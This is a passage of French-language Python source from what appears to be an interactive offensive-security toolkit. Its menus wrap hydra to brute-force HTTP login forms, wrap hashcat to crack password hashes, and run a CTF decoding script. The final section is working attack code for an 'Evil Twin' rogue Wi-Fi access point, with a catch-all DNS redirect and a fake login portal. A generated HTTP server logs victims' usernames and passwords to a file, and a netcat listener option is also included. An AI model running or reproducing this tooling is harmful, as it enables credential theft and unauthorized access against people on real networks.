            console.print(f"\n[info]🔥 Bruteforce user: [bold]{user}[/bold][/info]")
            cmd2 = [
                'hydra',
                '-l', user,
                '-P', pass_wordlist,
                target,
                'http-post-form',
                f'{form_path}:{form_data}:F={fail_string2}',
                '-vv'
            ]

            console.print(f"[dim]Commande: {' '.join(cmd2)}[/dim]\n")

            try:
                result = subprocess.run(cmd2, text=True)
                if result.returncode == 0:
                    console.print(f"\n[success]✓ Bruteforce terminé pour {user}[/success]")
                else:
                    console.print(f"\n[warning]⚠ Terminé avec code {result.returncode} pour {user}[/warning]")
            except KeyboardInterrupt:
                console.print(f"\n[warning]⚠ Bruteforce {user} interrompu[/warning]")
                break
            except Exception as e:
                console.print(f"\n[error]Erreur {user}: {e}[/error]")

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _hashcat_menu(self):
        """Crack hash avec hashcat (détection type via haiti + règles)"""
        import os
        import glob
        
        console.print("\n[title]═══ HASHCAT — CRACK HASH ═══[/title]")
        console.print("[info]🔓 Craquage de hash avec détection automatique du type[/info]\n")

        # Vérifier hashcat et haiti
        missing = []
        if subprocess.run(['which', 'hashcat'], capture_output=True).returncode != 0:
            missing.append('hashcat')
        
        # Haiti peut être installé dans ~/.local/share/gem/ruby/*/bin/ ou autre
        haiti_found = False
        haiti_cmd = 'haiti'
        
        # Liste des chemins à vérifier
        search_paths = [
            '/usr/local/bin/haiti',
            '/usr/bin/haiti',
            os.path.expanduser('~/bin/haiti'),
            os.path.expanduser('~/.local/bin/haiti'),
        ]
        
        # Chercher aussi dans ~/.local/share/gem/ruby/*/bin/
        gem_base = os.path.expanduser('~/.local/share/gem/ruby')
        if os.path.exists(gem_base):
            try:
                for version_dir in os.listdir(gem_base):
                    haiti_path = os.path.join(gem_base, version_dir, 'bin', 'haiti')
                    if os.path.exists(haiti_path):
                        search_paths.insert(0, haiti_path)
            except Exception:
                pass
        
        # Chercher aussi dans ~/.gem/ruby/*/bin/
        gem_base2 = os.path.expanduser('~/.gem/ruby')
        if os.path.exists(gem_base2):
            try:
                for version_dir in os.listdir(gem_base2):
                    haiti_path = os.path.join(gem_base2, version_dir, 'bin', 'haiti')
                    if os.path.exists(haiti_path):
                        search_paths.insert(0, haiti_path)
            except Exception:
                pass
        
        # Tester chaque chemin
        for path in search_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                haiti_found = True
                haiti_cmd = path
                break
        
        # Fallback: essayer which
        if not haiti_found:
            try:
                result = subprocess.run(['which', 'haiti'], 
                                       capture_output=True, text=True)
                if result.returncode == 0 and result.stdout.strip():
                    haiti_cmd = result.stdout.strip()
                    haiti_found = True
            except Exception:
                pass

        
        if not haiti_found:
            missing.append('haiti')
        
        if missing:
            console.print(f"[error]Outils manquants: {', '.join(missing)}[/error]")
            if 'hashcat' in missing:
                console.print("[dim]sudo apt install hashcat[/dim]")
            if 'haiti' in missing:
                console.print("[dim]gem install haiti-hash[/dim]")
                console.print("[dim]Puis ajouter ~/.local/share/gem/ruby/*/bin au PATH[/dim]")
            
            # Proposer de continuer sans haiti
            if 'haiti' in missing and 'hashcat' not in missing:
                skip_haiti = Prompt.ask("[orange1]Continuer sans haiti (mode manuel) ?[/orange1] [y/n]", default="n")
                if skip_haiti.lower() != 'y':
                    Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                    return
                # Continuer en mode manuel
                haiti_found = False
            else:
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return

        # ── ÉTAPE 1 : SAISIE DU HASH ──────────────────────────────────────────
        console.print("[orange1]═══ ÉTAPE 1 : HASH À CRACKER ═══[/orange1]\n")
        
        hash_input = Prompt.ask("[orange1]Hash[/orange1] (ou chemin vers fichier)")
        
        # Vérifier si c'est un fichier
        if os.path.exists(hash_input):
            hash_file = hash_input
            with open(hash_file, 'r') as f:
                hash_value = f.read().strip()
            console.print(f"[success]✓ Hash lu depuis {hash_file}[/success]")
        else:
            hash_value = hash_input.strip()
            # Créer un fichier temporaire pour hashcat
            hash_file = f"/tmp/nanachi_hash_{int(time.time())}.txt"
            with open(hash_file, 'w') as f:
                f.write(hash_value)
            cleanup_manager.register_temp_file(hash_file)

        # ── ÉTAPE 2 : DÉTECTION TYPE AVEC HAITI ───────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 2 : DÉTECTION TYPE ═══[/orange1]\n")
        console.print(f"[info]🔍 Analyse du hash avec haiti...[/info]")
        
        # Parser haiti si disponible
        hashcat_modes = []
        
        if haiti_found:
            try:
                haiti_result = subprocess.run(
                    [haiti_cmd, hash_value],
                    capture_output=True, text=True, timeout=10
                )
                
                # Afficher stdout ET stderr pour debug
                if haiti_result.stdout:
                    console.print(haiti_result.stdout)
                if haiti_result.stderr:
                    console.print(f"[dim]{haiti_result.stderr}[/dim]")
                
                # Parser la sortie de haiti pour extraire les types hashcat
                for line in haiti_result.stdout.split('\n'):
                    # Haiti format: "MD5 [HC: 0] [JtR: raw-md5]"
                    if '[HC:' in line:
                        import re
                        m = re.search(r'\[HC:\s*(\d+)\]', line)
                        if m:
                            mode = m.group(1)
                            # Extraire aussi le nom du hash
                            name = line.split('[HC:')[0].strip()
                            hashcat_modes.append({'mode': mode, 'name': name})
                
                if not hashcat_modes:
                    console.print("[warning]⚠ Haiti n'a pas pu identifier le type de hash[/warning]")
            
            except Exception as e:
                console.print(f"[error]Erreur haiti: {e}[/error]")
        
        # Si pas de modes détectés (pas de haiti ou échec), mode manuel
        if not hashcat_modes:
            # Heuristique simple : détecter par longueur
            hash_len = len(hash_value.strip())
            detected_types = []
            
            console.print(f"\n[info]Détection heuristique (longueur: {hash_len})...[/info]")
            
            if hash_len == 32:
                detected_types = [
                    {'mode': '0', 'name': 'MD5'},
                    {'mode': '1000', 'name': 'NTLM'},
                ]
            elif hash_len == 40:
                detected_types = [
                    {'mode': '100', 'name': 'SHA1'},
                    {'mode': '300', 'name': 'MySQL4.1/MySQL5'},
                ]
            elif hash_len == 64:
                detected_types = [
                    {'mode': '1400', 'name': 'SHA256'},
                ]
            elif hash_len == 128:
                detected_types = [
                    {'mode': '1700', 'name': 'SHA512'},
                ]
            elif hash_len == 16:
                detected_types = [
                    {'mode': '5100', 'name': 'Half MD5'},
                ]
            
            if detected_types:
                console.print("[success]Types probables détectés:[/success]")
                for idx, h in enumerate(detected_types, 1):
                    console.print(f"  {idx}. [white]{h['name']}[/white] (mode {h['mode']})")
                
                try:
                    choice = Prompt.ask("\n[orange1]Sélectionner un type ou 'm' pour mode manuel[/orange1]", default="1")
                    if choice.lower() == 'm':
                        detected_types = []
                    else:
                        idx = int(choice) - 1
                        hashcat_modes = [detected_types[idx]]
                except (ValueError, IndexError):
                    hashcat_modes = [detected_types[0]]
            
            # Si toujours pas de mode, passer en mode manuel complet
            if not hashcat_modes:
                console.print("\n[info]Mode manuel — saisir code hashcat[/info]")
                console.print("[dim]Tapez 'h' pour afficher la liste des codes[/dim]\n")
                
                manual_mode = Prompt.ask("[orange1]Mode hashcat[/orange1] (h pour liste)", default="0")
                
                if manual_mode.lower() == 'h':
                    # Afficher la table des modes hashcat courants
                    from rich.table import Table
                    hash_table = Table(title="Modes Hashcat Courants", box=box.ROUNDED)
                    hash_table.add_column("Code", style="cyan", width=6)
                    hash_table.add_column("Type", style="white", overflow="fold")
                    
                    common_modes = [
                        ("0", "MD5"),
                        ("10", "md5($pass.$salt)"),
                        ("20", "md5($salt.$pass)"),
                        ("100", "SHA1"),
                        ("110", "sha1($pass.$salt)"),
                        ("120", "sha1($salt.$pass)"),
                        ("400", "phpass, WordPress, Joomla"),
                        ("500", "md5crypt, MD5 (Unix)"),
                        ("900", "MD4"),
                        ("1000", "NTLM"),
                        ("1100", "Domain Cached Credentials (DCC)"),
                        ("1400", "SHA256"),
                        ("1410", "sha256($pass.$salt)"),
                        ("1420", "sha256($salt.$pass)"),
                        ("1700", "SHA512"),
                        ("1710", "sha512($pass.$salt)"),
                        ("1720", "sha512($salt.$pass)"),
                        ("1800", "sha512crypt (Unix)"),
                        ("2500", "WPA/WPA2"),
                        ("3000", "LM"),
                        ("3200", "bcrypt"),
                        ("5600", "NetNTLMv2"),
                        ("7500", "Kerberos 5 AS-REQ"),
                        ("13100", "Kerberos 5 TGS-REP"),
                        ("16500", "JWT (JSON Web Token)"),
                    ]
                    
                    for code, name in common_modes:
                        hash_table.add_row(code, name)
                    
                    console.print(hash_table)
                    console.print("\n[dim]Liste complète: https://hashcat.net/wiki/doku.php?id=example_hashes[/dim]\n")
                    
                    manual_mode = Prompt.ask("[orange1]Mode hashcat[/orange1]", default="0")
                
                hashcat_modes = [{'mode': manual_mode, 'name': 'Manuel'}]



        # Sélection du type
        if len(hashcat_modes) > 1:
            console.print("\n[orange1]Types détectés:[/orange1]")
            for idx, h in enumerate(hashcat_modes, 1):
                console.print(f"  {idx}. [white]{h['name']}[/white] (mode {h['mode']})")
            
            try:
                type_idx = int(Prompt.ask("[orange1]Type à utiliser[/orange1]", default="1"))
                selected_mode = hashcat_modes[type_idx - 1]['mode']
            except (ValueError, IndexError):
                selected_mode = hashcat_modes[0]['mode']
        else:
            selected_mode = hashcat_modes[0]['mode']
            console.print(f"[success]✓ Mode: {hashcat_modes[0]['name']} ({selected_mode})[/success]")

        # ── ÉTAPE 3 : WORDLIST ────────────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 3 : WORDLIST ═══[/orange1]\n")
        
        current_dir = os.getcwd()
        wordlists = glob.glob(os.path.join(current_dir, '*.txt'))
        wordlists += glob.glob(os.path.join(current_dir, '*.dic'))
        
        console.print(f"[orange1]Wordlists dans {current_dir}:[/orange1]")
        if wordlists:
            for idx, wl in enumerate(wordlists, 1):
                console.print(f"  {idx}. {os.path.basename(wl)}")
            console.print("  0. Chemin personnalisé")
            wl_choice = Prompt.ask("Wordlist", default="1")
            try:
                if wl_choice == "0":
                    wordlist = Prompt.ask("[orange1]Chemin wordlist[/orange1]")
                else:
                    wordlist = wordlists[int(wl_choice) - 1]
            except (ValueError, IndexError):
                wordlist = wordlists[0] if wordlists else None
        else:
            wordlist = Prompt.ask("[orange1]Chemin wordlist[/orange1]")

        if not wordlist or not os.path.exists(wordlist):
            console.print(f"[error]Wordlist introuvable: {wordlist}[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # ── ÉTAPE 4 : RÈGLES HASHCAT ──────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 4 : RÈGLES ═══[/orange1]\n")
        console.print("[dim]Les règles modifient les mots de la wordlist[/dim]")
        console.print("[dim]Exemples: +2 char random, majuscules, leet speak...[/dim]\n")
        
        console.print("[orange1]Options:[/orange1]")
        console.print("  1. Aucune règle (attaque directe)")
        console.print("  2. best64.rule (règles courantes)")
        console.print("  3. Append 2 random chars (?a?a)")
        console.print("  4. Append 3 random chars (?a?a?a)")
        console.print("  5. Append 4 random chars (?a?a?a?a)")
        console.print("  6. Règle personnalisée")
        
        rule_choice = Prompt.ask("[orange1]Règle[/orange1]", default="1")
        
        rule_args = []
        if rule_choice == "2":
            # best64.rule (généralement dans /usr/share/hashcat/rules/)
            rule_file = "/usr/share/hashcat/rules/best64.rule"
            if os.path.exists(rule_file):
                rule_args = ['-r', rule_file]
            else:
                console.print(f"[warning]⚠ {rule_file} introuvable, utilisation sans règle[/warning]")
        elif rule_choice == "3":
            # Append 2 chars: passe en mode masque hybride
            rule_args = ['-a', '6', wordlist, '?a?a']
            wordlist = None  # Ne pas passer -w en mode hybride
        elif rule_choice == "4":
            rule_args = ['-a', '6', wordlist, '?a?a?a']
            wordlist = None
        elif rule_choice == "5":
            rule_args = ['-a', '6', wordlist, '?a?a?a?a']
            wordlist = None
        elif rule_choice == "6":
            custom_rule = Prompt.ask("[orange1]Règle personnalisée[/orange1] (ex: best64.rule ou -a 6 ?a?a)")
            rule_args = custom_rule.split()

        # ── ÉTAPE 5 : OPTIONS SUPPLÉMENTAIRES ─────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 5 : OPTIONS ═══[/orange1]\n")
        
        show_potfile = Prompt.ask("[orange1]Afficher les hashs déjà crackés (potfile) ?[/orange1] [y/n]", default="n")
        if show_potfile.lower() == 'y':
            # Juste afficher le potfile
            potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
            if os.path.exists(potfile):
                console.print(f"\n[success]Contenu du potfile:[/success]")
                with open(potfile, 'r') as f:
                    console.print(f.read())
            else:
                console.print("[warning]Aucun hash cracké précédemment[/warning]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        workload = Prompt.ask("[orange1]Workload[/orange1] (1=low, 2=default, 3=high, 4=insane)", 
                             default="2")
        
        # Backend selection (CUDA/OpenCL)
        console.print("\n[orange1]Backend (GPU):[/orange1]")
        console.print("  1. Auto (laisser hashcat choisir)")
        console.print("  2. Ignorer CUDA (--backend-ignore-cuda)")
        console.print("  3. Ignorer OpenCL (--backend-ignore-opencl)")
        console.print("  4. CPU seulement (--backend-ignore-cuda --backend-ignore-opencl)")
        backend_choice = Prompt.ask("[orange1]Backend[/orange1]", default="1")
        
        backend_args = []
        if backend_choice == "2":
            backend_args.append('--backend-ignore-cuda')
        elif backend_choice == "3":
            backend_args.append('--backend-ignore-opencl')
        elif backend_choice == "4":
            backend_args.extend(['--backend-ignore-cuda', '--backend-ignore-opencl'])

        # ── ÉTAPE 6 : EXÉCUTION ───────────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 6 : CRACKING ═══[/orange1]\n")
        
        # Construction de la commande
        cmd = ['hashcat', '-m', selected_mode, '-w', workload, hash_file]
        
        # Backend
        cmd.extend(backend_args)
        
        if wordlist:
            cmd.append(wordlist)
        
        cmd.extend(rule_args)
        
        # Options utiles
        cmd.extend(['--status', '--status-timer=5'])  # Afficher progression toutes les 5s
        
        console.print(f"[info]🚀 Commande: {' '.join(cmd)}[/info]")
        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")

        try:
            result = subprocess.run(cmd)
            
            if result.returncode == 0:
                console.print("\n[success]✓ Hash cracké ![/success]")
                # Afficher le résultat
                show_cmd = ['hashcat', '-m', selected_mode, hash_file, '--show']
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                if show_result.stdout.strip():
                    console.print(f"\n[bold green]{show_result.stdout}[/bold green]")
            else:
                console.print(f"\n[warning]⚠ Terminé avec code {result.returncode}[/warning]")
                
        except KeyboardInterrupt:
            console.print("\n[warning]⚠ Cracking interrompu[/warning]")
        except Exception as e:
            console.print(f"\n[error]Erreur: {e}[/error]")

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _prushka_menu(self):
        """Décryptage automatique avec Prushka (CTF/forensics)"""
        import os
        
        console.print("\n[title]═══ PRUSHKA — DECRYPT ═══[/title]")
        console.print("[info]🔮 Décryptage automatique CTF/forensics[/info]\n")

        # Vérifier prushka
        prushka_path = None
        
        # Chercher prushka.py dans le répertoire courant
        if os.path.exists('./prushka.py'):
            prushka_path = './prushka.py'
        elif os.path.exists(os.path.expanduser('~/prushka.py')):
            prushka_path = os.path.expanduser('~/prushka.py')
        elif os.path.exists('/usr/local/bin/prushka.py'):
            prushka_path = '/usr/local/bin/prushka.py'
        
        if not prushka_path:
            console.print("[error]prushka.py n'est pas trouvé[/error]")
            console.print("[dim]Placez prushka.py dans le répertoire courant ou ~/[/dim]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        console.print(f"[success]✓ prushka.py trouvé : {prushka_path}[/success]\n")

        # ── ÉTAPE 1 : INPUT (CHAÎNE OU FICHIER) ───────────────────────────────
        console.print("[orange1]═══ ÉTAPE 1 : DONNÉES À DÉCRYPTER ═══[/orange1]\n")
        
        input_choice = Prompt.ask(
            "[orange1]Type d'entrée[/orange1]\n"
            "[dim]  1. Chaîne directe\n"
            "  2. Fichier[/dim]",
            choices=["1", "2"], default="1"
        )
        
        if input_choice == "1":
            data_input = Prompt.ask("[orange1]Chaîne à décrypter[/orange1]")
            file_mode = False
        else:
            data_input = Prompt.ask("[orange1]Chemin du fichier[/orange1]")
            if not os.path.exists(data_input):
                console.print(f"[error]Fichier introuvable: {data_input}[/error]")
                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
                return
            file_mode = True

        # ── ÉTAPE 2 : RÉCURSION ───────────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 2 : RÉCURSION ═══[/orange1]\n")
        console.print("[dim]Nombre de niveaux d'encodage à tester[/dim]")
        console.print("[dim]1 = rapide, 2 = moyen, 3+ = lent[/dim]\n")
        
        recursion = Prompt.ask("[orange1]Récursion[/orange1]", default="2")

        # ── ÉTAPE 3 : TOP RÉSULTATS ───────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 3 : AFFICHAGE ═══[/orange1]\n")
        
        top_n = Prompt.ask("[orange1]Nombre de résultats à afficher[/orange1] (1-100)", default="10")

        # ── ÉTAPE 4 : DÉTECTION HASH ──────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 4 : OPTIONS ═══[/orange1]\n")
        console.print("[warning]⚠ La détection de hash est lente[/warning]")
        
        detect_hash = Prompt.ask("[orange1]Activer détection hash (-h) ?[/orange1] [y/n]", default="n")

        # ── ÉTAPE 5 : WORDLIST (OPTIONNEL) ────────────────────────────────────
        use_wordlist = Prompt.ask("[orange1]Utiliser une wordlist ?[/orange1] [y/n]", default="n")
        
        wordlist_path = None
        if use_wordlist.lower() == 'y':
            import glob
            current_dir = os.getcwd()
            wordlists = glob.glob(os.path.join(current_dir, '*.txt'))
            
            if wordlists:
                console.print(f"\n[orange1]Wordlists dans {current_dir}:[/orange1]")
                for idx, wl in enumerate(wordlists, 1):
                    console.print(f"  {idx}. {os.path.basename(wl)}")
                console.print("  0. Chemin personnalisé")
                
                wl_choice = Prompt.ask("Wordlist", default="0")
                try:
                    if wl_choice == "0":
                        wordlist_path = Prompt.ask("[orange1]Chemin wordlist[/orange1]")
                    else:
                        wordlist_path = wordlists[int(wl_choice) - 1]
                except (ValueError, IndexError):
                    pass
            else:
                wordlist_path = Prompt.ask("[orange1]Chemin wordlist[/orange1]")

        # ── ÉTAPE 6 : EXÉCUTION ───────────────────────────────────────────────
        console.print("\n[orange1]═══ ÉTAPE 6 : DÉCRYPTAGE ═══[/orange1]\n")

        # Construction de la commande
        cmd = ['python3', prushka_path]
        
        if file_mode:
            # Mode fichier : lire le contenu et le passer en argument
            with open(data_input, 'r') as f:
                content = f.read().strip()
            cmd.append(content)
        else:
            # Mode chaîne directe
            cmd.append(data_input)
        
        # Code opération (0 = toutes)
        cmd.append('0')
        
        # Récursion
        cmd.extend(['-r', recursion])
        
        # Top N résultats
        cmd.extend(['-v', top_n])
        
        # Hash detection
        if detect_hash.lower() == 'y':
            cmd.append('-h')
        
        # Wordlist
        if wordlist_path and os.path.exists(wordlist_path):
            cmd.extend(['-w', wordlist_path])

        console.print(f"[info]🚀 Commande: {' '.join(cmd)}[/info]")
        console.print("[dim]Pendant l'exécution:[/dim]")
        console.print("[dim]  's' = afficher progression[/dim]")
        console.print("[dim]  'q' = arrêter[/dim]")
        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")

        try:
            result = subprocess.run(cmd)
            
            if result.returncode == 0:
                console.print("\n[success]✓ Décryptage terminé[/success]")
            else:
                console.print(f"\n[warning]⚠ Terminé avec code {result.returncode}[/warning]")
                
        except KeyboardInterrupt:
            console.print("\n[warning]⚠ Décryptage interrompu[/warning]")
        except Exception as e:
            console.print(f"\n[error]Erreur: {e}[/error]")

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _fake_ap_menu(self):
        """Crée un Fake AP (Evil Twin) avec hostapd + dnsmasq"""
        console.print("\n[title]═══ FAKE AP — EVIL TWIN ═══[/title]")
        console.print("[info]📡 Crée un point d'accès WiFi factice[/info]")
        console.print("[warning]⚠ Requiert: hostapd, dnsmasq, sudo[/warning]\n")

        # ── Vérifier les dépendances ──────────────────────────────────────────
        missing = []
        for tool in ['hostapd', 'dnsmasq']:
            r = subprocess.run(['which', tool], capture_output=True)
            if r.returncode != 0:
                missing.append(tool)
        if missing:
            console.print(f"[error]Outils manquants: {', '.join(missing)}[/error]")
            console.print(f"[dim]sudo apt install {' '.join(missing)}[/dim]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        # ── Sélection interface WiFi ──────────────────────────────────────────
        wifi_ifaces = self.dns_monitor.get_wifi_interfaces()
        if not wifi_ifaces:
            console.print("[error]Aucune interface WiFi trouvée[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return

        console.print("[orange1]Interfaces WiFi disponibles:[/orange1]")
        for idx, iface in enumerate(wifi_ifaces, 1):
            ip_info = next(
                (f" [green]({n['ip']})[/green]" for n in self.interfaces
                 if n['name'] == iface and n['ip'] != 'N/A'), ""
            )
            console.print(f"  {idx}. {iface}{ip_info}")

        iface_choice = Prompt.ask("Interface pour le Fake AP", default="1")
        try:
            ap_iface = wifi_ifaces[int(iface_choice) - 1]
        except (ValueError, IndexError):
            ap_iface = wifi_ifaces[0]

        # ── Config AP ─────────────────────────────────────────────────────────
        console.print("\n[orange1]Configuration du Fake AP:[/orange1]")
        ssid = Prompt.ask("[orange1]SSID (nom du réseau)[/orange1]", default="FreeWifi")
        channel = Prompt.ask("[orange1]Canal WiFi[/orange1]", default="6")
        ap_ip = Prompt.ask("[orange1]IP de l'AP[/orange1]", default="192.168.66.1")
        dhcp_start = '.'.join(ap_ip.split('.')[:3]) + '.10'
        dhcp_end   = '.'.join(ap_ip.split('.')[:3]) + '.100'

        # ── Mode capture ──────────────────────────────────────────────────────
        console.print("\n[orange1]Mode de capture:[/orange1]")
        console.print("  1. [white]HTTP — portail captif (capture credentials navigateur)[/white]")
        console.print("  2. [white]Netcat — tout le trafic TCP brut sur un port[/white]")
        mode = Prompt.ask("Mode", default="1")

        nc_port = None
        if mode == "2":
            nc_port = Prompt.ask("[orange1]Port netcat[/orange1]", default="8080")

        # ── Écrire configs temporaires ────────────────────────────────────────
        import tempfile, signal
        tmpdir = tempfile.mkdtemp(prefix='fakeap_')

        # hostapd.conf
        hostapd_conf = f"""interface={ap_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        hostapd_path = f"{tmpdir}/hostapd.conf"
        with open(hostapd_path, 'w') as f:
            f.write(hostapd_conf)

        # dnsmasq.conf
        dnsmasq_conf = f"""interface={ap_iface}
dhcp-range={dhcp_start},{dhcp_end},255.255.255.0,12h
dhcp-option=3,{ap_ip}
dhcp-option=6,{ap_ip}
server=8.8.8.8
log-queries
log-dhcp
listen-address={ap_ip}
bind-interfaces
"""
        if mode == "1":
            # Portail captif : rediriger tout le DNS vers nous
            dnsmasq_conf += f"address=/#/{ap_ip}\n"
        dnsmasq_path = f"{tmpdir}/dnsmasq.conf"
        with open(dnsmasq_path, 'w') as f:
            f.write(dnsmasq_conf)

        # Script HTTP minimal si mode portail
        portal_path = None
        if mode == "1":
            portal_html = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>Connexion WiFi</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f0f0;}
.box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);min-width:300px;}
h2{margin-top:0}input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;}
button{width:100%;padding:12px;background:#0070c9;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
</style></head><body><div class="box">
<h2>🔒 Connexion sécurisée</h2>
<p>Entrez vos identifiants pour accéder au réseau.</p>
<form method="POST" action="/login">
<input name="username" placeholder="Nom d'utilisateur" required>
<input name="password" type="password" placeholder="Mot de passe" required>
<button type="submit">Se connecter</button>
</form></div></body></html>"""
            portal_path = f"{tmpdir}/portal.html"
            with open(portal_path, 'w') as f:
                f.write(portal_html)

            # Serveur HTTP minimal en Python pour capturer les POST
            # Générer le script HTTP sans f-string multiligne (évite les \n ambigus)
            NL = '\n'
            http_server_script = (
                "#!/usr/bin/env python3" + NL +
                "import http.server, urllib.parse, datetime" + NL + NL +
                f"CREDS_FILE = '{tmpdir}/captured_creds.txt'" + NL +
                f"PORTAL_PATH = '{portal_path}'" + NL + NL +
                "class Handler(http.server.BaseHTTPRequestHandler):" + NL +
                "    def log_message(self, fmt, *args): pass" + NL +
                "    def do_GET(self):" + NL +
                "        with open(PORTAL_PATH, 'rb') as f: data = f.read()" + NL +
                "        self.send_response(200)" + NL +
                "        self.send_header('Content-Type', 'text/html; charset=utf-8')" + NL +
                "        self.end_headers()" + NL +
                "        self.wfile.write(data)" + NL +
                "    def do_POST(self):" + NL +
                "        length = int(self.headers.get('Content-Length', 0))" + NL +
                "        body = self.rfile.read(length).decode('utf-8', errors='ignore')" + NL +
                "        params = urllib.parse.parse_qs(body)" + NL +
                "        user = params.get('username', [''])[0]" + NL +
                "        pwd  = params.get('password', [''])[0]" + NL +
                "        ts   = datetime.datetime.now().strftime('%H:%M:%S')" + NL +
                "        line = f'[{ts}] IP={self.client_address[0]}  user={user}  pass={pwd}'" + NL +
                r"        print(f'\033[91m\U0001f480 CREDENTIALS: {line}\033[0m', flush=True)" + NL +
                "        with open(CREDS_FILE, 'a') as cf: cf.write(line + chr(10))" + NL +
                "        self.send_response(302)" + NL +
                "        self.send_header('Location', '/')" + NL +
                "        self.end_headers()" + NL + NL +
                "if __name__ == '__main__':" + NL +
                "    s = http.server.HTTPServer(('0.0.0.0', 80), Handler)" + NL +
                "    print('HTTP captif en ecoute sur :80', flush=True)" + NL +
                "    s.serve_forever()" + NL
            )
            http_path = f"{tmpdir}/http_server.py"
            with open(http_path, 'w') as f:
                f.write(http_server_script)

        # ── Lancer l'AP ──────────────────────────────────────────────────────
        console.print(f"\n[success]🚀 Démarrage du Fake AP '[bold]{ssid}[/bold]' sur {ap_iface}...[/success]")
        console.print(f"[dim]Configs dans: {tmpdir}[/dim]\n")

        procs = []
        try:
            # 1. Mettre l'interface en mode managed propre
            subprocess.run(['sudo', 'ip', 'link', 'set', ap_iface, 'down'], capture_output=True)
            subprocess.run(['sudo', 'iw', 'dev', ap_iface, 'set', 'type', '__ap'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', ap_iface, 'up'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', ap_iface], capture_output=True)
            subprocess.run(['sudo', 'ip', 'addr', 'add', f'{ap_ip}/24', 'dev', ap_iface], capture_output=True)

            # 2. hostapd
            console.print("[info]▶ hostapd...[/info]")
            p_hostapd = subprocess.Popen(
                ['sudo', 'hostapd', hostapd_path],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
            procs.append(p_hostapd)
            cleanup_manager.register_process(p_hostapd)
            time.sleep(2)

            # 3. dnsmasq
            console.print("[info]▶ dnsmasq...[/info]")
            p_dnsmasq = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', dnsmasq_path, '--no-daemon'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
            procs.append(p_dnsmasq)
            cleanup_manager.register_process(p_dnsmasq)
            time.sleep(1)

            # 4. Mode capture
            if mode == "1":
                console.print("[info]▶ Portail captif HTTP:80...[/info]")
                p_http = subprocess.Popen(
                    ['sudo', 'python3', http_path],
                    stdout=None, stderr=None
                )
                procs.append(p_http)
                creds_file = f"{tmpdir}/captured_creds.txt"
                console.print(f"\n[success]✓ Fake AP actif ![/success]")
                console.print(f"[orange1]SSID  : [bold]{ssid}[/bold][/orange1]")
                console.print(f"[orange1]IP AP : {ap_ip}[/orange1]")
                console.print(f"[orange1]Creds : {creds_file}[/orange1]")
                console.print("[warning]\nCtrl+C pour arrêter — credentials capturés en temps réel ↓[/warning]\n")

                # Afficher les credentials au fil de l'eau
                with open(creds_file, 'w') as _:
                    pass  # créer le fichier vide
                seen_lines = 0
                while True:
                    time.sleep(1)
                    try:
                        with open(creds_file, 'r') as cf:
                            lines = cf.readlines()
                        for line in lines[seen_lines:]:
                            console.print(f"[bold red]💀 {line.strip()}[/bold red]")
                            seen_lines += 1
                    except Exception:
                        pass

            elif mode == "2":
                console.print(f"[info]▶ Netcat listener sur :{nc_port}...[/info]")
                # Détecter ncat/nc
                nc_cmd = 'ncat' if subprocess.run(['which','ncat'],capture_output=True).returncode == 0 else 'nc'
                console.print(f"\n[success]✓ Fake AP actif + listener sur :{nc_port}[/success]")
                console.print(f"[orange1]SSID: [bold]{ssid}[/bold] — connectez une cible[/orange1]")
                console.print("[warning]Ctrl+C pour arrêter[/warning]\n")
                subprocess.run(['sudo', nc_cmd, '-lnvp', nc_port])

        except KeyboardInterrupt:
            console.print("\n[warning]Arrêt du Fake AP...[/warning]")
        finally:
            for p in procs:
                try:
                    subprocess.run(['sudo', 'kill', str(p.pid)], capture_output=True)
                except Exception:
                    pass
            # Nettoyer l'interface
            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', ap_iface], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', ap_iface, 'down'], capture_output=True)
            subprocess.run(['sudo', 'iw', 'dev', ap_iface, 'set', 'type', 'managed'], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', ap_iface, 'up'], capture_output=True)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], capture_output=True)
            console.print("[success]✓ Interface restaurée[/success]")
            import shutil
            try:
                shutil.rmtree(tmpdir)
